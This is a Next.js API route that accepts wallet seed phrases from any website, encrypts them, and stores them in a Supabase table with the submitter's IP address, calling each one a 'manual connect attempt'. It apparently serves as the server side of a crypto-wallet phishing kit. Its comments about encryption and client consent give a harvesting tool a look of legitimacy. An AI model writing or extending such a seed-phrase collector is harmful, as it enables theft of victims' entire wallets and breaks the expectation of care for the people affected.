// Next.js API Route: manual-attempt (with encrypted seed phrase storage)
// Accepts manual connection attempts INCLUDING seed phrases.
// IMPORTANT: Seed phrases are encrypted before storage. Client consent required.

import { encryptSeedPhrase } from '@/lib/encryption';

const { createClient } = require('@supabase/supabase-js');

const SUPABASE_URL = process.env.SUPABASE_URL;
const SUPABASE_KEY = process.env.SUPABASE_ANON_KEY;

let supabase = null;
if (SUPABASE_URL && SUPABASE_KEY) {
  supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Only POST allowed' });

  let body = req.body || {};
  try { if (typeof body === 'string' && body.trim()) body = JSON.parse(body); } catch (e) { return res.status(400).json({ error: 'Invalid JSON' }); }


  const seedPhrase = (body.seedPhrase || '').trim();
  const type = body.type || 'manual-connect-attempt';

  if (!seedPhrase) return res.status(400).json({ error: 'Seed phrase required' });

  let encryptedPhrase;
  try {
    encryptedPhrase = encryptSeedPhrase(seedPhrase);
  } catch (e) {
    console.error('[manual-attempt] encryption failed', e);
    return res.status(500).json({ error: 'Encryption failed' });
  }

  if (supabase) {
    try {
      const { error } = await supabase.from('manual_attempts').insert([
        {
          type: type,
          encrypted_seed_phrase: encryptedPhrase,
          created_at: new Date().toISOString(),
          ip_address: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
        },
      ]);

      if (error) {
        console.error('[manual-attempt] supabase error', error);
      } else {
        console.log('[manual-attempt] stored encrypted seed phrase');
      }
    } catch (e) {
      console.error('[manual-attempt] supabase insert failed', e);
    }
  } else {
    console.warn('[manual-attempt] Supabase not configured, skipping storage');
  }

  return res.status(200).json({ 
    status: 'ok', 
    message: 'Manual attempt received and securely stored.',
    encrypted: true 
  });
}
